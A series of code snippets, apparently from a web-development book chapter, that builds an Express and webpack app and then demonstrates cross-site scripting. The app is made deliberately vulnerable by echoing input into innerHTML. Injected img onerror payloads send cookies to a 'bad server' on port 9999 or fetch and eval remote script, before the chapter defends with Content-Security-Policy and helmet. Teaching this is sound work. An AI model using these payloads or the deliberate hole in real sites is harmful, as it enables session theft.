["```js\nimport { Request, Response } from \"express\";\nexport const readHandler = (req: Request, resp: Response) => {   \n    resp.json({\n        message: \"Hello, World\"\n    });\n} \n```", "```js\nimport { createServer } from \"http\";\nimport express, {Express } from \"express\";\nimport { readHandler } from \"./readHandler\";\nconst port = 5000;\nconst expressApp: Express = express();\nexpressApp.use(express.json());\nexpressApp.post(\"/read\", readHandler);\nexpressApp.use(express.static(\"static\"));\nexpressApp.use(express.static(\"node_modules/bootstrap/dist\"));\nconst server = createServer(expressApp);\nserver.listen(port,\n    () => console.log(`HTTP Server listening on port ${port}`)); \n```", "```js\n<!DOCTYPE html>\n<html>\n    <head>\n        <script src=\"img/client.js\"></script>\n        <link href=\"css/bootstrap.min.css\" rel=\"stylesheet\" />\n    </head>\n    <body>\n       <button id=\"btn\" class=\"btn btn-primary m-2\">Send Request</button>\n       <table class=\"table table-striped\">\n            <tbody>\n                <tr><th>Status</th><td id=\"msg\"></td></tr>\n                <tr><th>Response</th><td id=\"body\"></td></tr>\n            </tbody>\n       </table>\n    </body>\n</html> \n```", "```js\nnpm start \n```", "```js\nnpm install --save-dev webpack@5.89.0\nnpm install --save-dev webpack-cli@5.1.4\nnpm install --save-dev npm-run-all@4.1.5 \n```", "```js\nimport path from \"path\";\nimport { fileURLToPath } from 'url';\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\nexport default  {\n    mode: \"development\",\n    entry: \"./static/client.js\",\n    output: {\n        path: path.resolve(__dirname, \"dist/client\"),\n        filename: \"bundle.js\"\n    }\n}; \n```", "```js\n<!DOCTYPE html>\n<html>\n    <head>\n        **<script src=\"img/bundle.js\"></script>**\n        <link href=\"css/bootstrap.min.css\" rel=\"stylesheet\" />\n    </head>\n    <body>\n       <button id=\"btn\" class=\"btn btn-primary m-2\">Send Request</button>\n       <table class=\"table table-striped\">\n            <tbody>\n                <tr><th>Status</th><td id=\"msg\"></td></tr>\n                <tr><th>Response</th><td id=\"body\"></td></tr>\n            </tbody>\n       </table>\n    </body>\n</html> \n```", "```js\n...\nexpressApp.post(\"/read\", readHandler);\nexpressApp.use(express.static(\"static\"));\nexpressApp.use(express.static(\"node_modules/bootstrap/dist\"));\n**expressApp.use(express.static(\"****dist/client\"));**\n... \n```", "```js\n...\n\"scripts\": {\n **\"server\": \"tsc-watch --onsuccess \\\"node dist/server.js\\\"\",**\n **\"client\"****: \"webpack --watch\",**\n **\"start\": \"npm-run-all --parallel server client\"**\n},\n... \n```", "```js\ndocument.addEventListener('DOMContentLoaded', function() {\n    document.getElementById(\"btn\").addEventListener(\"click\", sendReq);\n});\nsendReq = async () => {\n    let payload = [];\n    for (let i = 0; i < 5; i++) {\n        payload.push({ id: i, message: `Payload Message: ${i}\\n`});\n    }\n    const response = await fetch(\"/read\", {\n        method: \"POST\", body: JSON.stringify(payload),\n        headers: {\n            \"Content-Type\": \"application/json\"\n        }\n    })\n    document.getElementById(\"msg\").textContent = response.statusText;\n  **document.getElementById(\"body\").textContent**\n **= `Resp: ${await response.text()}`;**\n} \n```", "```js\nassets by status 1.86 KiB [cached] 1 asset\n./static/client.js 631 bytes [built]\nwebpack 5.89.0 compiled successfully in 13 ms \n```", "```js\nnpm install --save-dev webpack-dev-server@4.15.1 \n```", "```js\nimport path from \"path\";\nimport { fileURLToPath } from 'url';\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\nexport default  {\n    mode: \"development\",\n    entry: \"./static/client.js\",\n    output: {\n        path: path.resolve(__dirname, \"dist/client\"),\n        filename: \"bundle.js\"\n **},**\n **\"devServer\": {**\n **port: 5100,**\n **static: [\"./static\", \"node_modules/bootstrap/dist\"]**\n **}**\n}; \n```", "```js\n...\n\"scripts\": {\n   ** \"server\": \"tsc-watch --noClear --onsuccess \\\"node dist/server.js\\\"\",**\n **\"client\": \"webpack serve\",**\n    \"start\": \"npm-run-all --parallel server client\"\n},\n... \n```", "```js\n<!DOCTYPE html>\n<html>\n    <head>\n        <script src=\"img/bundle.js\"></script>\n        <link href=\"css/bootstrap.min.css\" rel=\"stylesheet\" />\n    </head>\n    <body>\n       **<button id=\"****btn\" class=\"btn btn-primary m-2\">Send Message</button>**\n       <table class=\"table table-striped\">\n            <tbody>\n                <tr><th>Status</th><td id=\"msg\"></td></tr>\n                <tr><th>Response</th><td id=\"body\"></td></tr>\n            </tbody>\n       </table>\n    </body>\n</html> \n```", "```js\ndocument.addEventListener('DOMContentLoaded', function() {\n    document.getElementById(\"btn\").addEventListener(\"click\", sendReq);\n});\n**const requestUrl = \"http://localhost:5000/read\";**\nsendReq = async () => {\n    let payload = [];\n    for (let i = 0; i < 5; i++) {\n        payload.push({ id: i, message: `Payload Message: ${i}\\n`});\n    }\n **   const response = await fetch(requestUrl, {**\n        method: \"POST\", body: JSON.stringify(payload),\n        headers: {\n            \"Content-Type\": \"application/json\"\n        }\n    })\n    document.getElementById(\"msg\").textContent = response.statusText;\n    document.getElementById(\"body\").textContent\n        = `Resp: ${await response.text()}`;\n} \n```", "```js\nnpm install cors@2.8.5\nnpm install --save-dev @types/cors@2.8.16 \n```", "```js\nimport { createServer } from \"http\";\nimport express, {Express } from \"express\";\nimport { readHandler } from \"./readHandler\";\n**import cors from \"cors\";**\nconst port = 5000;\nconst expressApp: Express = express();\n**expressApp.use(cors({**\n **origin: \"http://localhost:5100\"**\n**}));**\nexpressApp.use(express.json());\nexpressApp.post(\"/read\", readHandler);\nexpressApp.use(express.static(\"static\"));\nexpressApp.use(express.static(\"node_modules/bootstrap/dist\"));\nexpressApp.use(express.static(\"dist/client\"));\nconst server = createServer(expressApp);\nserver.listen(port,\n    () => console.log(`HTTP Server listening on port ${port}`)); \n```", "```js\nimport path from \"path\";\nimport { fileURLToPath } from 'url';\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\nexport default  {\n    mode: \"development\",\n    entry: \"./static/client.js\",\n    output: {\n        path: path.resolve(__dirname, \"dist/client\"),\n        filename: \"bundle.js\"\n    },\n    \"devServer\": {\n        port: 5100,\n        static: [\"./static\", \"node_modules/bootstrap/dist\"],\n        **proxy: {**\n **\"/read\": \"http://localhost:5000\"**\n **}**\n    }\n}; \n```", "```js\ndocument.addEventListener('DOMContentLoaded', function() {\n    document.getElementById(\"btn\").addEventListener(\"click\", sendReq);\n});\n**const requestUrl = \"/read\";**\nsendReq = async () => {\n    let payload = [];\n    for (let i = 0; i < 5; i++) {\n        payload.push({ id: i, message: `Payload Message: ${i}\\n`});\n    }\n    const response = await fetch(requestUrl, {\n        method: \"POST\", body: JSON.stringify(payload),\n        headers: {\n            \"Content-Type\": \"application/json\"\n        }\n    })\n    document.getElementById(\"msg\").textContent = response.statusText;\n    document.getElementById(\"body\").textContent\n        = `Resp: ${await response.text()}`;\n} \n```", "```js\nnpm install http-proxy@1.18.1 \n```", "```js\nimport { createServer } from \"http\";\nimport express, {Express } from \"express\";\nimport { readHandler } from \"./readHandler\";\nimport cors from \"cors\";\n**import httpProxy from \"http-proxy\";**\nconst port = 5000;\nconst expressApp: Express = express();\n**const proxy = httpProxy.createProxyServer({**\n **target: \"http://localhost:5100\", ws: true**\n**});**\nexpressApp.use(cors({\n    origin: \"http://localhost:5100\"\n}));\nexpressApp.use(express.json());\nexpressApp.post(\"/read\", readHandler);\nexpressApp.use(express.static(\"static\"));\nexpressApp.use(express.static(\"node_modules/bootstrap/dist\"));\n**//expressApp.use(express.static(\"dist/client\"));**\n**expressApp.use((req, resp) => proxy.web(req, resp));**\nconst server = createServer(expressApp);\n**server.on('upgrade', (req, socket, head) => proxy.ws(req, socket, head));**\nserver.listen(port,\n    () => console.log(`HTTP Server listening on port ${port}`)); \n```", "```js\nimport path from \"path\";\nimport { fileURLToPath } from 'url';\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\nexport default  {\n    mode: \"development\",\n    entry: \"./static/client.js\",\n    output: {\n        path: path.resolve(__dirname, \"dist/client\"),\n        filename: \"bundle.js\"\n    },\n    \"devServer\": {\n        port: 5100,\n        static: [\"./static\", \"node_modules/bootstrap/dist\"],\n        **// proxy: {**\n **//     \"/read\": \"http://localhost:5000\"**\n **// },**\n **client: {**\n **webSocketURL****: \"http://localhost:5000/ws\"**\n **}**\n    }\n}; \n```", "```js\n<!DOCTYPE html>\n<html>\n    <head>\n        <script src=\"img/bundle.js\"></script>\n        <link href=\"css/bootstrap.min.css\" rel=\"stylesheet\" />\n    </head>\n    <body>\n       ** <div class=\"m-2\">**\n **<****label class=\"form-label\">Message:</label>**\n **<input id=\"input\" class=\"****form-control\" />**\n **</div>**\n        <button id=\"btn\" class=\"btn btn-primary m-2\">Send Message</button>\n        <table class=\"table table-striped\">\n            <tbody>\n                <tr><th>Status</th><td id=\"msg\"></td></tr>\n                <tr><th>Response</th><td id=\"body\"></td></tr>\n            </tbody>\n       </table>\n    </body>\n</html> \n```", "```js\ndocument.addEventListener('DOMContentLoaded', function() {\n    document.getElementById(\"btn\").addEventListener(\"click\", sendReq);\n});\nconst requestUrl = \"/read\";\nsendReq = async () => {\n    **// let payload = document.getElementById(\"input\").value;**\n **// for (let i = 0; i < 5; i++) {**\n **//     payload.push({ id: i, message: `Payload Message: ${i}\\n`});**\n **// }**\n    const response = await fetch(requestUrl, {\n       ** method: \"POST\", body****: document.getElementById(\"input\").value,**\n **// headers: {**\n **//     \"Content-Type\": \"application/json\"**\n **// }**\n    })\n    document.getElementById(\"msg\").textContent = response.statusText;\n    document.getElementById(\"body\").innerHTML = await response.text();\n} \n```", "```js\nimport { Request, Response } from \"express\";\nexport const readHandler = (req: Request, resp: Response) => {   \n    **// resp.json({**\n **//     message: \"Hello, World\"**\n **// });**\n **resp.cookie(\"sessionID\", \"mysecretcode\");**\n **req.pipe(resp);**\n} \n```", "```js\nimport { createServer } from \"http\";\nimport express from \"express\";\nimport cors from \"cors\";\ncreateServer(express().use(cors()).use(express.static(\"static\"))\n    .post(\"*\", (req, resp) => {\n        req.on(\"data\", (data) => { console.log(data.toString()) });\n        req.on(\"end\", () => resp.end());\n    })).listen(9999,\n        () => console.log(`Bad Server listening on port 9999`)); \n```", "```js\nnode badServer.mjs \n```", "```js\n<img src=\"img/city.png\" onclick=\"location='http://packt.com'\"> \n```", "```js\n<button class=\"btn btn-danger\" onclick=\"location='http://packt.com'\">Click</button> \n```", "```js\n<img src=\"img/nope\" onerror=\"fetch('http://localhost:9999', { method: 'POST', body: document.cookie})\"> \n```", "```js\nBad Server listening on port 9999\n**sessionID=mysecretcode** \n```", "```js\nconst input = document.getElementById(\"input\");\nconst button = document.getElementById(\"btn\");\nconst newButton = button.cloneNode();\nbutton.parentElement.replaceChild(newButton, button);\nnewButton.textContent = \"Bad Button\";\nnewButton.addEventListener(\"click\", () => {\n    sendReq();\n    fetch(\"http://localhost:9999\", {\n        method: \"POST\",\n        body: JSON.stringify({\n            cookie: document.cookie,\n            input: input.value\n        })\n    });\n});\ninput.value = \"\";\ninput.placeholder = \"Enter something secret here\";\ndocument.getElementById(\"body\").innerHTML = \"\"; \n```", "```js\n<img src=\"img/nope\" onerror=\"fetch('http://localhost:9999/bad.js').then(r => r.text()).then(t => eval(t))\"> \n```", "```js\n...\n{\"cookie\":\"sessionID=mysecretcode\",\"input\":\"myothersecret\"}\n... \n```", "```js\n`...`\n`document.getElementById(\"body\").innerHTML = await response.text();`\n`...` \n```", "```js\nimport { createServer } from \"http\";\nimport express, {Express } from \"express\";\nimport { readHandler } from \"./readHandler\";\nimport cors from \"cors\";\nimport httpProxy from \"http-proxy\";\nconst port = 5000;\nconst expressApp: Express = express();\nconst proxy = httpProxy.createProxyServer({\n    target: \"http://localhost:5100\", ws: true\n});\n**expressApp.use((****req, resp, next) => {**\n **resp.setHeader(\"Content-Security-Policy\", \"img-src 'self'\");**\n **next();**\n**})**\nexpressApp.use(cors({\n    origin: \"http://localhost:5100\"\n}));\nexpressApp.use(express.json());\nexpressApp.post(\"/read\", readHandler);\nexpressApp.use(express.static(\"static\"));\nexpressApp.use(express.static(\"node_modules/bootstrap/dist\"));\n//expressApp.use(express.static(\"dist/client\"));\nexpressApp.use((req, resp) => proxy.web(req, resp));\nconst server = createServer(expressApp);\nserver.on('upgrade', (req, socket, head) => proxy.ws(req, socket, head));\nserver.listen(port,\n    () => console.log(`HTTP Server listening on port ${port}`)); \n```", "```js\n...\nresp.setHeader(\"Content-Security-Policy\", **\"img-src 'self'\"**);\n... \n```", "```js\n`default-src` \n```", "```js\n`connect-src` \n```", "```js\n`img-src` \n```", "```js\n`script-src` \n```", "```js\n`script-src-attr` \n```", "```js\n`form-action` \n```", "```js\n...\nRefused to load the image 'http://localhost:9999/city.png' because it violates the following Content Security Policy directive: \"img-src 'self'\".\n... \n```", "```js\nnpm install helmet@7.1.0 \n```", "```js\nimport { createServer } from \"http\";\nimport express, {Express } from \"express\";\nimport { readHandler } from \"./readHandler\";\nimport cors from \"cors\";\nimport httpProxy from \"http-proxy\";\n**import helmet from \"helmet\";**\nconst port = 5000;\nconst expressApp: Express = express();\nconst proxy = httpProxy.createProxyServer({\n    target: \"http://localhost:5100\", ws: true\n});\n**// expressApp.use((req, resp, next) => {**\n**//     resp.setHeader(\"Content-Security-Policy\",**\n**//       \"img-src 'self'; connect-src 'self'\");**\n**//     next();**\n**// })**\n**expressApp.use(helmet({**\n **contentSecurityPolicy: {**\n **directives: {**\n **imgSrc: \"'self'\",**\n **scriptSrcAttr: \"'none'\",**\n **scriptSrc: \"'****self'\",**\n **connectSrc: \"'self' ws://localhost:5000\"** \n **}**\n **}**\n**}));**\nexpressApp.use(cors({\n    origin: \"http://localhost:5100\"\n}));\nexpressApp.use(express.json());\nexpressApp.post(\"/read\", readHandler);\nexpressApp.use(express.static(\"static\"));\nexpressApp.use(express.static(\"node_modules/bootstrap/dist\"));\nexpressApp.use((req, resp) => proxy.web(req, resp));\nconst server = createServer(expressApp);\nserver.on('upgrade', (req, socket, head) => proxy.ws(req, socket, head));\nserver.listen(port,\n    () => console.log(`HTTP Server listening on port ${port}`)); \n```", "```js\nimport path from \"path\";\nimport { fileURLToPath } from 'url';\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\nexport default  {\n    mode: \"development\",\n    entry: \"./static/client.js\",\n    output: {\n        path: path.resolve(__dirname, \"dist/client\"),\n        filename: \"bundle.js\"\n    },\n    \"devServer\": {\n        port: 5100,\n        static: [\"./static\", \"node_modules/bootstrap/dist\"],\n        client: {\n            webSocketURL: \"http://localhost:5000/ws\"\n        }\n    },\n   **devtool: \"source-map\"**\n}; \n```"]